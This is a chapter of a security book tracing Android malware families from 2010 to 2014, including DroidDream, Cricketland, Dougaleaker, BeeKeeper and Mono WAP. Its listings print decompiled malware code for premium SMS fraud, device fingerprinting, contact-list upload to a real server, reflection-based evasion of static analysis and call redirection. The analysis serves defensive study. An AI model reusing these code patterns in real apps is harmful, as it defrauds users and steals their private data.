<html><head></head><body>
<div id="book-content">
<div id="sbo-rt-content"><h2 class="h2" id="ch02"><span epub:type="pagebreak" id="page_27"/><strong><span class="big">2</span><br/>ANDROID MALWARE IN THE WILD</strong></h2>&#13;
<div class="image1"><img src="../images/common.jpg" alt="Image" width="189" height="189"/></div>&#13;
<p class="noindentsa">This chapter is an overview of interesting Android malware found in the wild since 2010, when the first specimens were discovered. As you’ll soon see, malware authors are constantly searching for more profitable ways to abuse Android devices, leading to the rise and decline of numerous malware families.</p>&#13;
<p class="indent">There are millions of Android malware samples out there, and this chapter could not possibly cover them all. Instead, we chose to focus mainly on famous malware families with high app counts, likely devised by large-scale malicious enterprises. These enterprises are usually interesting in some way, be it for their technological capabilities or their operational prowess. We also highlight some malware families that haven’t been discussed in publications elsewhere. Even regular readers of the Android Security team’s <em>Android Security Year in Review</em> reports should discover new information here. For each malware family, we discuss its technical properties, its interesting features, and its place in Android malware history.<span epub:type="pagebreak" id="page_28"/></p>&#13;
<div class="note">&#13;
<p class="notet"><strong><span class="notes">NOTE</span></strong></p>&#13;
<p class="notep"><em>We refer to malware samples by their package name, their version code, and the first four digits of the malware file’s SHA-256 hash, like this:</em> com.batterypro <em>(v4, 29ee). Using this information, you should be able to find the malware samples in your own malware file databases.</em></p>&#13;
</div>&#13;
<h3 class="h3" id="ch02lev1"><strong>The Early Years: 2008 to 2012</strong></h3>&#13;
<p class="noindent">Hackers were quick to discover Android. The platform launched in 2008, when criminal malware enterprises had already begun abusing other operating systems. Eighteen months later, its swiftly acquired market share had made it commercially interesting to criminal malware authors, and in 2010, the first Android malware sample appeared on Google Play (known as Android Market at the time).</p>&#13;
<p class="indent">To this day, nearly all known Android malware aims to make money through illicit methods. Contrast this with the much older world of DOS, Windows, and Linux malware, which saw decades of technical innovation before profit became the primary motive of malware authors. By comparison, Android malware remains primarily interesting for its exploration of all the new ways smartphones can be exploited to make money at scale in ways that are not possible on desktop systems.</p>&#13;
<p class="indent">After the first high-profile malware incidents, the Android Security team developed a plan to keep Google Play free of malware. To evade the new defenses, malware authors adopted a few strategies: continuing to develop malware for release on Google Play, which required investment in techniques for bypassing Google Play’s malware scanning; developing malware for distribution through third-party websites and app stores (called sideloading), which required investment in marketing methods that would appeal to users; and developing malware to be preinstalled on devices, which required investment in social engineering and strategies such as setting up fake business fronts to deceive device manufacturers into including malware on their devices as part of the manufacturing process. This chapter details malware distributed in all of these ways.</p>&#13;
<h4 class="h4" id="ch02lev1sec1"><strong><em>DroidSMS</em></strong></h4>&#13;
<p class="noindent">In August 2010, the Russian security company Kaspersky discovered malware outside of Google Play. Dubbed DroidSMS and described in a blog post titled “First SMS Trojan for Android,” this is often considered to be the first Android malware family.</p>&#13;
<p class="indent">DroidSMS was used to send costly SMS messages from user devices to a premium SMS number that fraudsters had registered earlier. When users installed and ran DroidSMS, the app sent a hidden message without the user noticing. The user would then get billed a small sum of money for the message, which would go to the malware authors. Affected users only learned about this illicit charge the next time they received their phone bill, and only if they cared to check their bill for inexplicable charges.</p>&#13;
<p class="indent">All of this secret SMS activity happened within the boundaries of Android’s platform security model. In particular, Android’s permission <span epub:type="pagebreak" id="page_29"/>system worked as designed, displaying a dialog that asked users whether to allow DroidSMS to send messages. At the time, Android often let users make security-relevant decisions. After all, Android was an open system, the prevalent way of thinking went, and so users should make their own security and privacy choices; Android and Google Play would merely provide users with the information needed to make such decisions. However, apps that abused many users’ lack of security mindset soon began appearing on Google Play.</p>&#13;
<p class="indent">In retrospect, the idea of leaving security and privacy decisions up to the users may have seemed reasonable in the days when nobody but technology enthusiasts used Android. But as soon as it began to gain widespread appeal, this system broke down. It is not rational to expect billions of everyday users to understand the intricacies of Android’s permission system. The Android team eventually realized this and retrofitted Android with the many “safe-by-default” techniques that now protect users from straightforward abuse like that perpetrated by DroidSMS.</p>&#13;
<h4 class="h4" id="ch02lev1sec2"><strong><em>DroidDream</em></strong></h4>&#13;
<p class="noindent">A few months after DroidSMS appeared, the Android malware situation escalated. In March 2011, San Francisco–based security company Lookout Mobile Security discovered a new trojan on Google Play that it named DroidDream. As described in Lookout’s blog post “Security Alert: DroidDream Malware Found in Official Android Market,” DroidDream went further than previous Android malware, as it broke out of the boundaries of the Android security model. Using a privilege escalation exploit called Rage Against the Cage (also known as CVE-2010-EASY), DroidDream exploited a vulnerability in the Android operating system to gain root privileges.</p>&#13;
<p class="indent">DroidDream was a turning point for the Android Security team. Because affected devices were permanently compromised and users could not reset them to a secure state, it became mandatory for Google Play apps to be scanned for safety before getting into users’ hands. The Android Security team quickly announced that they would remove existing DroidDream installations from devices, which would save at least those users that had installed but not yet opened infected apps.</p>&#13;
<p class="indent">Remote removal of apps had not previously been attempted, and removing DroidDream from devices relied on a hack built into the Google Play app. Due to the obvious value of remote removal, the Android Security team added it as an official feature to Google Play Protect. Nowadays, the Android Security team regularly protects Android users by remotely removing suspected malware apps in high-risk categories, such as bank phishing or ransomware, and rooting trojans like DroidDream.</p>&#13;
<h4 class="h4" id="ch02lev1sec3"><strong><em>The Wallpaper Family</em></strong></h4>&#13;
<p class="noindent">This large SMS fraud malware family from the early Android days pretended to offer home screen wallpapers for download. Despite its size, this malware family has not yet been publicly described.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_30"/>Like all early Android malware, it did not protect itself against analysis. Its apps executed their malicious payload without applying any obfuscation or other trickery to throw off security researchers. For example, <a href="ch02.xhtml#ch2lis1">Listing 2-1</a> shows the SMS fraud functionality in <em>com.kk4.SkypeWallpapers</em> (v3, 8cab). The app checks whether it is running on a Russian phone and, if so, executes the <code>makeRelation</code> method to send an undisclosed premium SMS.</p>&#13;
<pre>private void makeRelation(&#13;
    String phoneNumber, String message, Context context) {&#13;
  int v3_0 = 0;&#13;
 &#13;
  AlertDialog.Builder v6_1 = AlertDialog.Builder(this);&#13;
  v6_1.setMessage("You don't have enough permissions");&#13;
  v6_1.setCancelable(0);&#13;
  v6_1.setNeutralButton("OK",&#13;
    new com.kk4.SkypeWallpapers.AlertActivity$5(this));&#13;
 &#13;
  PendingIntent v4_0 = PendingIntent.getBroadcast(&#13;
    this, v3_0, new Intent("SMS_SENT"), v3_0);&#13;
 &#13;
  PendingIntent v5_0 = PendingIntent.getBroadcast(&#13;
    this, v3_0, new Intent("SMS_DELIVERED"), v3_0);&#13;
 &#13;
  this.registerReceiver(&#13;
    new com.kk4.SkypeWallpapers.AlertActivity$6(this, v6_1),&#13;
    new IntentFilter("SMS_SENT"));&#13;
 &#13;
  SmsManager.getDefault().sendTextMessage(&#13;
    phoneNumber, 0, message, v4_0, v5_0);&#13;
}</pre>&#13;
<p class="list" id="ch2lis1"><em>Listing 2-1: Premium SMS fraud in</em> com.kk4.SkypeWallpapers <em>(v3, 8cab)</em></p>&#13;
<p class="indent">The method name <code>makeRelation</code> is characteristic of this family. Readers with access to Android malware databases can search for it to discover additional samples.</p>&#13;
<h4 class="h4" id="ch02lev1sec4"><strong><em>The Camera Family</em></strong></h4>&#13;
<p class="noindent">This large SMS fraud malware family is unnamed and has no publicly available documentation. Often disguised as camera apps or other system utilities, it became active in mid-2011 and proved more sophisticated than the Wallpaper family.</p>&#13;
<p class="indent">Rather than merely targeting users in Russia, this malware family collected information about the device’s country and mobile carrier, sent it to a command-and-control server, and received the phone number and SMS message text to send. This technique allowed it to operate in different countries and expand into new countries, without updating the apps. <a href="ch02.xhtml#ch2lis2">Listing 2-2</a>, <span epub:type="pagebreak" id="page_31"/>taken from <em>com.batterypro</em> (v4, 29ee), shows how this device profiling data was collected.</p>&#13;
<pre>if (this.prefsWrapper.isFirstRun()) {&#13;
  this.params.put("pid", this.getString(2131034134));&#13;
  this.params.put("pin", String.valueOf(this.utils.getPin()));&#13;
  this.params.put("carrier",&#13;
    this.telephonyInfo.getTelephonyNetworkOperatorName().replaceAll("\n", ""));&#13;
  this.params.put("imei", this.telephonyInfo.getTelephonyIMEI());&#13;
  this.params.put("market", "1");&#13;
  this.params.put("cc",&#13;
    this.telephonyInfo.getTelephonyNetworkOperator());&#13;
  this.params.put("appurl", this.getString(2131034135));&#13;
}</pre>&#13;
<p class="list" id="ch2lis2"><em>Listing 2-2: The</em> com.batterypro <em>(v4, 29ee) app collects device information that is later used to customize SMS fraud.</em></p>&#13;
<p class="indent">Benign and malicious apps alike commonly record the data points collected by this app, like the device’s International Mobile Equipment Identity (IMEI). As IMEI numbers are globally unique identifiers, they can be used to fingerprint devices, identify individual users, and associate other collected data with a particular device.</p>&#13;
<p class="indent">To curb the abuse of IMEIs for user tracking, Android 10 began guarding access to the IMEI and other similar hardware identifiers by using a special permission called <code>READ_PRIVILEGED_PHONE_STATE</code>. This permission is not available to apps on Google Play. Apps that want to access these hardware identifiers must find other distribution opportunities.</p>&#13;
<h4 class="h4" id="ch02lev1sec5"><strong><em>Cricketland</em></strong></h4>&#13;
<p class="noindent">While SMS fraud accounted for about 20 percent of the Android malware in 2012 and received the most public attention, the availability of sensitive data on mobile phones also gave rise to spyware. In fact, spyware was the most common malware category in the early days of Google Play—and among the early spyware families, Cricketland was the largest.</p>&#13;
<p class="indent">Publicly undocumented until now, Cricketland was an SDK embedded in seemingly legitimate apps from Vietnam. It is not clear whether app developers using this SDK knew of its spyware functionality. Without user consent, the SDK would send the user’s contact list information to a remote server. The Android Security team named it Cricketland after the SDK package name, <em>net.cricketland</em>.</p>&#13;
<p class="indent">Cricketland’s code was not very sophisticated. When an app with Cricketland initialized the SDK, it collected all kinds of information and uploaded it to a page hosted on Google Drive. One example of an app using the Cricketland SDK was <em>masteryourgames.amazingalextoolbox</em> (v12, c4f0). Its data collection code is shown in <a href="ch02.xhtml#ch2lis3">Listing 2-3</a>.<span epub:type="pagebreak" id="page_32"/></p>&#13;
<pre>net.cricketland.android.lib.report.CReportField[] v0_4 =&#13;
  new net.cricketland.android.lib.report.CReportField[17];&#13;
v0_4[0] = net.cricketland.android.lib.report.CReportField.DEVICE_ID;&#13;
v0_4[1] = net.cricketland.android.lib.report.CReportField.UUID;&#13;
v0_4[2] = net.cricketland.android.lib.report.CReportField.PACKAGE_NAME;&#13;
v0_4[3] = net.cricketland.android.lib.report.CReportField.VERSION_CODE;&#13;
v0_4[4] = net.cricketland.android.lib.report.CReportField.IP;&#13;
v0_4[5] = net.cricketland.android.lib.report.CReportField.PHONE;&#13;
v0_4[6] = net.cricketland.android.lib.report.CReportField.ACCOUNTS;&#13;
v0_4[7] = net.cricketland.android.lib.report.CReportField.CONTACTS;&#13;
v0_4[8] = net.cricketland.android.lib.report.CReportField.LOCALE;&#13;
v0_4[9] = net.cricketland.android.lib.report.CReportField.LOCATION;&#13;
v0_4[10] = net.cricketland.android.lib.report.CReportField.SDK;&#13;
v0_4[11] = net.cricketland.android.lib.report.CReportField.BUILD;&#13;
v0_4[12] = net.cricketland.android.lib.report.CReportField.CPU;&#13;
v0_4[13] = net.cricketland.android.lib.report.CReportField.MEM;&#13;
v0_4[14] = net.cricketland.android.lib.report.CReportField.DISPLAY;&#13;
v0_4[15] = net.cricketland.android.lib.report.CReportField.FEATURES;&#13;
v0_4[16] = net.cricketland.android.lib.report.CReportField.PACKAGES;</pre>&#13;
<p class="list" id="ch2lis3"><em>Listing 2-3: Cricketland data collection code in</em> masteryourgames.amazingalextoolbox <em>(v12, c4f0)</em></p>&#13;
<p class="indent">The Android Security team considers any app that collects a user’s contact list without consent to be spyware. Collecting phone location or account information without user consent is also problematic and covered in Google’s Mobile Unwanted Software policy. As this account information includes all accounts registered on a device, malware can use it to connect a user’s email address with their LinkedIn profile, X name, Facebook page, and more.</p>&#13;
<p class="indent">The danger of collecting account information to build cross-platform user profiles should be obvious. In Android 8.0 (Oreo), the Android team removed the ability to silently collect this information without user consent.</p>&#13;
<h4 class="h4" id="ch02lev1sec6"><strong><em>Dougaleaker</em></strong></h4>&#13;
<p class="noindent">Another notable spyware network from 2012 was Dougaleaker, which targeted the contact list information of Japanese nationals. It was discovered by US-based security company McAfee and described in a blog post titled “Android Malware Promises Video While Stealing Contacts.”</p>&#13;
<p class="indent">Japanese police eventually arrested the authors of Dougaleaker, who went on trial for spyware distribution but were found not guilty by a Japanese court. Little information about this case is available in the English-language press, but the article “5 Tokyo Devs Cuffed over ‘The Movie’ Android App Scam,” published in <em>The Register</em>, provides some background.</p>&#13;
<p class="indent">After a user launches a Dougaleaker app, for example <em>jp.co.dougastation</em> (v2, 83fd), the spyware functionality sends their contact list information to a web server (<a href="ch02.xhtml#ch2lis4">Listing 2-4</a>).<span epub:type="pagebreak" id="page_33"/></p>&#13;
<pre>String v1_0 = jp.co.dougastation.util.PhoneUtil.getPref(this, "ALREADY_GET");&#13;
if ((jp.co.dougastation.util.StringUtil.isEmpty(v1_0)) || (!v1_0.equals("true"))) {&#13;
  String[] v3_5 = new String[2];&#13;
  v3_5[0] = "http://i-hug.net";&#13;
  v3_5[1] = "/appli/addressBookRegist";&#13;
  String v2_0 = jp.co.dougastation.util.StringUtil.addString(v3_5);&#13;
  java.util.ArrayList v0_1 = new java.util.ArrayList();&#13;
  v0_1.add(new BasicNameValuePair("telNo", &#13;
    jp.co.dougastation.util.PhoneUtil.getTelNo(this)));&#13;
  v0_1.add(new BasicNameValuePair("individualNo", &#13;
    jp.co.dougastation.util.PhoneUtil.getIndividualNo(this)));&#13;
  v0_1.add(new BasicNameValuePair("simSerialNo", &#13;
    jp.co.dougastation.util.PhoneUtil.getSimSerialNo(this)));&#13;
  v0_1.add(new BasicNameValuePair("appliId", "4"));&#13;
  if (4 &gt;= jp.co.dougastation.util.PhoneUtil.getSdkVersion()) {&#13;
    v0_1.add(new BasicNameValuePair("addressBook", this.getMailUnder4()));&#13;
  } else {&#13;
    v0_1.add(new BasicNameValuePair("addressBook", &#13;
      jp.co.dougastation.util.AddressBookUtil.getAddressBookOver4(&#13;
        this.getContentResolver())));&#13;
  }&#13;
  jp.co.dougastation.util.HttpUtil.doPost(v2_0, v0_1);</pre>&#13;
<p class="list" id="ch2lis4"><em>Listing 2-4: Dougaleaker spyware code in</em> jp.co.dougastation <em>(v2, 83fd)</em></p>&#13;
<p class="indent">Dougaleaker’s limited spyware functionality and narrow target suggest that it was created for just one purpose: to map the social connections of all people in Japan. Due to the app’s very high installation numbers, the authors were likely successful in their goal.</p>&#13;
<h4 class="h4" id="ch02lev1sec7"><strong><em>BeeKeeper</em></strong></h4>&#13;
<p class="noindent">BeeKeeper is another previously undescribed large-scale SMS fraud family that targeted Russian Android users. To gain installations, the malware apps impersonated popular brands. The Android Security team called the family BeeKeeper because it mostly targeted mobile phones on the Russian Beeline mobile carrier network.</p>&#13;
<p class="indent">On a technical level, BeeKeeper was interesting for two reasons. First, it used a command-and-control structure that was powerful for its time: it supported more than a dozen commands, with names such as <code>sendContactList</code>, <code>sendSms</code>, <code>catchSms</code>, and <code>openUrl</code>. The server controlled every action BeeKeeper took on a device.</p>&#13;
<p class="indent">Second, BeeKeeper used reflection as an obfuscation technique to hide its behavior from static analysis. <em>Reflection</em> is a Java feature that allows developers to examine, modify, or invoke classes, objects, and methods in a program. The use of reflection introduces a level of indirectness that makes it difficult for static app analysis to succeed. In particular, it allows the code to <span epub:type="pagebreak" id="page_34"/>reference classes and methods through obfuscated, encoded, and encrypted strings.</p>&#13;
<p class="indent"><a href="ch02.xhtml#ch2lis5">Listing 2-5</a> shows how BeeKeeper used reflection to dynamically resolve the Android API method <code>SmsManager.sendTextMessage</code> and then send texts using that method.</p>&#13;
<pre>public static boolean sendSms(String number, String text) {&#13;
  boolean v5_0 = true;&#13;
  try {&#13;
    Class v3_0 = Class.forName("android.telephony.SmsManager");&#13;
    Object v4_0 = v3_0.getMethod("getDefault",&#13;
      new Class[0]).invoke(0, new Object[0]);&#13;
    Class[] v8_5 = new Class[5];&#13;
    v8_5[0] = Class.forName("java.lang.String");&#13;
    v8_5[1] = Class.forName("java.lang.String");&#13;
    v8_5[2] = Class.forName("java.lang.String");&#13;
    v8_5[3] = Class.forName("android.app.PendingIntent");&#13;
    v8_5[4] = Class.forName("android.app.PendingIntent");&#13;
    reflect.Method v2_0 = v3_0.getMethod("sendTextMessage", v8_5);&#13;
    Object[] v7_5 = new Object[5];&#13;
    v7_5[0] = number;&#13;
    v7_5[1] = 0;&#13;
    v7_5[2] = text;&#13;
    v7_5[3] = 0;&#13;
    v7_5[4] = 0;&#13;
    v2_0.invoke(v4_0, v7_5);&#13;
  } catch (Exception v0_0) {&#13;
    v0_0.printStackTrace();&#13;
    v5_0 = false;&#13;
  }&#13;
  return v5_0;&#13;
}</pre>&#13;
<p class="list" id="ch2lis5"><em>Listing 2-5: The app</em> com.qiwi.application <em>(v4, 37f3) impersonated the digital wallet service Qiwi and used reflection to hide from static analysis.</em></p>&#13;
<p class="indent">First, the malware creates an object of the Android <code>SmsManager</code> class that has the ability to send SMS messages. Then, it looks up the <code>sendTextMessage</code> method with its five <code>String</code> and <code>PendingIntent</code> arguments. Finally, it calls the <code>sendTextMessage</code> API to send the costly SMS to a concrete phone number.</p>&#13;
<p class="indent">To this day, reflection is one of the most common techniques used to evade malware analysis and detection. Usually reflection-based obfuscation is not as easy to understand as it is in BeeKeeper’s case, because modern Android malware typically encrypts and obfuscates the string arguments passed to the reflection APIs. Some malware analysis tools can’t handle this combination of encryption and reflection, so they aren’t able to effectively analyze modern Android malware.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_35"/>In more extreme cases, the arguments passed to the reflection API are not made available in the code at all. We have seen such arguments loaded from an app’s asset files or even the internet.</p>&#13;
<h4 class="h4" id="ch02lev1sec8"><strong><em>Dogowar</em></strong></h4>&#13;
<p class="noindent">On a lighter note, next we’ll highlight an Android malware specimen that was not created for profit. Android.Dogowar, first described by US-based security company Symantec in an August 2011 blog post titled “Animal Rights Protesters Use Mobile Means for Their Message,” modified a legitimate yet controversial game, <em>Dog Wars</em>, by adding two pieces of functionality. First, it sent the text message “I take pleasure in hurting small animals, just thought you should know that” to all contacts from the device’s contact list. Second, it sent an SMS to the premium number 73822 to subscribe the device to a news service about animal welfare topics provided by People for the Ethical Treatment of Animals (PETA). Clearly, the malware developer took offense at the simulated dog-fighting game and everybody playing it.</p>&#13;
<h4 class="h4" id="ch02lev1sec9"><strong><em>Other Early Android Malware</em></strong></h4>&#13;
<p class="noindent">Other examples of early malware found on Google Play include Plankton, DroidKungFu, ggTracker, DroidDream Light, and Gingermaster. Because security researchers have thoroughly described these, we don’t cover them here. You can find more information about them with a quick web search.</p>&#13;
<p class="indent">The early years of sideloaded and preloaded malware are harder to reconstruct. At the time, the Android Security team and external security researchers focused on Google Play, so data from 2011 and 2012 that describes other malware is spotty and difficult to obtain. The Security team keeps a historical log of all Google Play apps, but no such log exists for sideloaded apps. Based on the limited data we have, we believe that DroidDream Light, a spyware variant of DroidDream that didn’t include any privilege escalation exploits, may have been the most sideloaded malware of 2011. In 2012, RuFraud, another premium SMS fraud family targeting Russia, was likely the most popular sideloaded malware.</p>&#13;
<p class="indent">We are not aware of any preloaded malware (that is, malware preinstalled on Android devices) active between 2010 and 2012. However, we also doubt that researchers looked for preloaded malware in those early years, so it’s possible that it existed and nobody knew about it.</p>&#13;
<h3 class="h3" id="ch02lev2"><strong>The Professionalization of Malware: 2013 and 2014</strong></h3>&#13;
<p class="noindent">The year 2013 was historic for Android malware. Previous specimens occasionally caused severe harm and sometimes spread widely, but they rarely did both at the same time. No malware network excelled in distribution, technology, and profitability all at once. This changed in 2013, when several malware families appeared that were created by developers who understood the components of a successful malware enterprise. These <span epub:type="pagebreak" id="page_36"/>malware developers likely organized themselves as modest software shops, unlike the presumed lone-wolf or small-scale operations of previous years.</p>&#13;
<p class="indent">While SMS fraud and spyware continued to dominate in 2013 (combined, they made up more than 50 percent of all malware on Google Play that year), hostile downloaders (20 percent) and rooting trojans (20 percent) were important, too.</p>&#13;
<h4 class="h4" id="ch02lev1sec10"><strong><em>Ghost Push</em></strong></h4>&#13;
<p class="noindent">Of all the new, sophisticated malware families available on Google Play in 2013, Ghost Push was the largest, responsible for nearly all rooting trojans of that year. Its developers set up a highly scaled, profitable network consisting of thousands of apps that they refined over the following years (and are potentially still updating today).</p>&#13;
<p class="indent">The Android Security team has known about this family since 2014, but public documentation of it didn’t exist until September 2015, when the Chinese security company Cheetah Mobile described it in a Chinese-language blog post. Despite its scale, antivirus vendors did not detect this network for about two years.</p>&#13;
<p class="indent">What exactly Ghost Push does is hard to understand. While analyzing any of its individual files is straightforward, Ghost Push is part of a massive malware distribution industry operating out of China, and any analysis must take this context into account. Since at least 2013, this malware industry has generated more Android malware than any other source. As far as we can tell, it consists of an undetermined number of malware creators and distributors. The distributors infiltrate Google Play, third-party stores, and device manufacturers to build reliable malware distribution channels. Their apps use a plug-in-based system to download malicious modules provided by the malware creators.</p>&#13;
<p class="indent">This distribution method hides how many people and companies are involved. We’ve seen samples that download more than 20 malicious plug-ins with different functionality. How many of these plug-ins are built by the same people? Are the malware distributors and malware creators completely separate entities, or is there overlap? These are open questions. One thing we do know is that this industry is laser-focused on making money, be it through ad spam, click fraud, pushing app installs for pay, or other means.</p>&#13;
<h4 class="h4" id="ch02lev1sec11"><strong><em>BadNews, RuFraud, and RuPlay</em></strong></h4>&#13;
<p class="noindent">SMS fraud malware continued to affect Russian users in 2013. BadNews was a hostile downloader family first discovered by Lookout Mobile Security in April 2013 and described in a blog post titled “The Bearer of BadNews.” RuPlay and RuFraud made up a network of malware families that have not yet been publicly documented: RuPlay apps acted as hostile downloaders on Google Play that downloaded RuFraud apps from elsewhere.</p>&#13;
<p class="indent">Like many other malware families, RuPlay apps impersonated popular apps of the day. The RuPlay developers registered dozens of domains with names like <em><a href="http://subwaysurfcheats.com">subwaysurfcheats.com</a></em> and <em>angrybirds.p.ht</em>. They created websites <span epub:type="pagebreak" id="page_37"/>that copied the look of Google Play and urged users to download apps under false pretenses (for example, to get updates to popular gaming apps like Subway Surfer and Angry Birds). They also used keyword spam and other nefarious techniques to game Google Play’s search result rankings, deceiving users into downloading the impersonators instead of the legitimate apps.</p>&#13;
<div class="note">&#13;
<p class="notet"><strong><span class="notes">NOTE</span></strong></p>&#13;
<p class="notep"><em>Besides tricking users into downloading fake versions of real apps, the RuPlay apps on Google Play did not contain harmful functionality—the SMS fraud element was in the RuFraud apps they downloaded and installed—so we won’t show any source code here. For a representative example, interested readers can analyze</em> com.wHill ClimbRacingMoneyMod <em>(v1366388635, 9de8), which pretended to offer cheats for the hit game Hill Climb Racing.</em></p>&#13;
</div>&#13;
<p class="indent">The ultimate download location of RuPlay SMS fraud apps was a website called <em>hotdroid-apps.pm</em>. That website is long gone, and most of its malicious apps are lost to history. One surviving app is <em>flv.app</em> (v118, 6ed2), which many antivirus products recognize as malware named FakeApp, FakeInst, or Agent. Built for SMS fraud, it contained some other interesting ideas.</p>&#13;
<p class="indent">For example, the app’s command-and-control server could instruct the app to redirect outgoing calls made by the user. Because we don’t have access to the server’s logs, we don’t know the purpose of this functionality, but it’s likely that the app tried to intercept users’ calls to their mobile carriers to avoid complaints about unrecognized charges. Instead of reaching the carrier’s support hotline, the user would unwittingly call the fraudsters. The code in <a href="ch02.xhtml#ch2lis6">Listing 2-6</a> shows how this works.</p>&#13;
<pre>String v26_0 = intent.getExtras().getString(&#13;
  "android.intent.extra.PHONE_NUMBER");&#13;
flv.app.Settings.log(new StringBuilder("phone: ").append(v26_0).toString());&#13;
if (!flv.app.Settings.isRedirect(v26_0)) {&#13;
  return;&#13;
} else {&#13;
  flv.app.Settings.log("isRedirect: true");&#13;
  this.setResultData(0);&#13;
  flv.app.Settings.makeCall(context, flv.app.Settings.callTo);&#13;
  ...</pre>&#13;
<p class="list" id="ch2lis6"><em>Listing 2-6: The app</em> flv.app <em>(v118, 6ed2) redirects phone calls made by the user.</em></p>&#13;
<p class="indent">The app’s command-and-control server also supported commands unrelated to text and call activity. For example, the command <code>antiUninstall</code> prompted a system dialog to grant the app device administrator permissions and included a scary message downloaded from the server. For years, Android malware used administrator permissions to keep users from removing malicious apps. Over time, the Android Security team worked with the operating system team to remove device administrator properties abused by malware, until the API itself became deprecated in Android 9.0 (Pie). In Android 10, the API stopped doing anything at all.</p>&#13;
<h4 class="h4" id="ch02lev1sec12"><span epub:type="pagebreak" id="page_38"/><strong><em>WallySMS</em></strong></h4>&#13;
<p class="noindent">Another SMS fraud family, WallySMS targeted countries in Western Europe. <a href="ch02.xhtml#ch2lis7">Listing 2-7</a> is a sample from <em>com.albertech.harlemshake</em> (v2, 31f8) that checks whether the device is in France, Spain, or Germany by inspecting the mobile country code (MCC). It then assigns the device a Base64-encoded premium SMS number for fraudulent activity.</p>&#13;
<pre>private static boolean i() { &#13;
  boolean v0_6;&#13;
  switch (Integer.parseInt(((TelephonyManager)com.albertech.harlemshake.a.h.&#13;
      getSystemService("phone")).getNetworkOperator().substring(0, 3))) { &#13;
    case 208: { &#13;
      com.albertech.harlemshake.a.k = new String(&#13;
        Base64.decode("ODE3ODk=", 0), "UTF-8");&#13;
      v0_6 = true;&#13;
      break;&#13;
    }&#13;
    case 214: { &#13;
      try { &#13;
        com.albertech.harlemshake.a.k = new String(&#13;
          Base64.decode("MjUyMjE=", 0), "UTF-8");&#13;
      } catch (UnsupportedEncodingException v0) { &#13;
        v0_6 = false;&#13;
      }&#13;
    }&#13;
    case 262: { &#13;
      com.albertech.harlemshake.a.k = new String(&#13;
        Base64.decode("NDY2NDU=", 0), "UTF-8");&#13;
    }&#13;
    default: { &#13;
      v0_6 = false;&#13;
    }&#13;
  }&#13;
&#13;
  return v0_6;&#13;
}</pre>&#13;
<p class="list" id="ch2lis7"><em>Listing 2-7: The app</em> com.albertech.harlemshake <em>(v2, 31f8) has premium SMS payloads for France (MCC 208), Spain (MCC 214), and Germany (MCC 262) only.</em></p>&#13;
<p class="indent">Dynamic analysis of this sample has shown that, when executed on a device configured for any other country, the app won’t display any malicious activity.</p>&#13;
<p class="indent">Modern mobile phones come in many configurations, so malware analysis tools must understand the environmental requirements of the malware they’re analyzing. In particular, they should combine insights from static and dynamic analysis, because setting up the appropriate dynamic analysis environment is tricky without information gained from static analysis. The <span epub:type="pagebreak" id="page_39"/>most sophisticated malware analysis tools pass information between static and dynamic analysis engines.</p>&#13;
<h4 class="h4" id="ch02lev1sec13"><strong><em>Mono WAP</em></strong></h4>&#13;
<p class="noindent">Responding to the prevalence of SMS fraud in the early Android years, the operating system team made some changes to better protect users. In 2012, Android 4.2 (Jelly Bean) added a warning dialog that opens whenever an app sends a text to a premium number. Around 2014, this Android version reached critical distribution. This small change decreased the profitability of SMS fraud significantly and blocked the most straightforward way to make illicit money on Android. While some SMS fraud families continued to be uploaded to Google Play, none became huge or were backed by sophisticated malware authors. Instead, the people running professional malware businesses sought out other ways to make a quick buck off Android users.</p>&#13;
<p class="indent">The next best way to defraud users was to turn to other forms of phone billing fraud. In many countries, phone users can pay for services through a technology called Wireless Application Protocol (WAP) billing. WAP billing servers can be accessed over HTTP, making it easy for malicious apps to connect to them. The downside for fraudsters is that WAP billing is not as widespread as SMS-based billing, limiting them to targets in a few countries, like Russia, Thailand, Vietnam, Spain, and the United Kingdom.</p>&#13;
<p class="indent">Mono WAP, the largest WAP fraud family of 2014, was interesting for reasons beyond its wide distribution: namely its choice of programming language and the miniscule size of its malicious code, which made it hard to spot.</p>&#13;
<p class="indent">Unlike other large Android malware families, which were almost exclusively written in Java, Mono WAP was written in Mono for Android, an open source software framework that allowed developers to create Android apps in .NET languages like C#. (In 2016, Microsoft acquired the company behind Mono for Android and renamed the framework to Xamarin.Android.) This choice of language posed big problems to antivirus technologies that could only analyze Java code.</p>&#13;
<p class="indent">The Mono WAP fraud family’s other interesting feature is that it contained barely any code and operated extremely subtly. It loaded WAP fraud pages in a WebView, the standard Android component used to show web pages without a web browser, and signed the user up for a recurring premium service subscription. Before mobile carriers beefed up WAP sign-up protection, a Mono WAP app only had to collect the device’s Android ID and send it to a domain hosted by the fraudsters.</p>&#13;
<p class="indent">For example, the sample <em>com.baibla.krasive</em> (v1, 9604) made requests to URLs like this one:</p>&#13;
<pre>http://mobifs.ru/?app=krasivejshiemestaplanety\&amp;aid=30016d7eaab21a25</pre>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_40"/>The <code>app</code> URL parameter presumably identified the app from which the request originated, and the <code>aid</code> parameter identified the user to sign up for a premium service.</p>&#13;
<p class="indent">This simple scheme only worked on devices connected to the carrier network providing the premium subscription service. No sign-up could happen if the device was on Wi-Fi or another carrier’s mobile network. Still, the ease of signing up for premium services through simple HTTP connections made WAP fraud hard to detect. How does one distinguish a legitimate HTTP request from one that signs users up for services against their will? In their early days, WAP fraud apps were often only discovered after enough users had complained about unwanted charges.</p>&#13;
<p class="indent">Over the years, mobile carriers improved fraud protection through two-factor authentication and other mechanisms for proving that a user had authorized a payment. In some countries, governments changed legislation around WAP billing to favor consumers. As mobile carriers improved the security of their WAP sign-up pages, WAP fraud apps became more sophisticated: malicious apps now needed to intercept two-factor authentication texts and use JavaScript or other techniques to enter the confirmation code into a dialog.</p>&#13;
<p class="indent">WAP fraud continued to be profitable and widespread on Android until at least 2023. As legitimate WAP billing is a great source of extra income for mobile carriers, more and more countries and mobile carriers have started to enable it for their customers. Every new WAP billing market immediately attracts WAP fraud malware, as new WAP billing operators are often inexperienced in fighting abuse and fraud.</p>&#13;
<h4 class="h4" id="ch02lev1sec14"><strong><em>Cryptocurrency Malware</em></strong></h4>&#13;
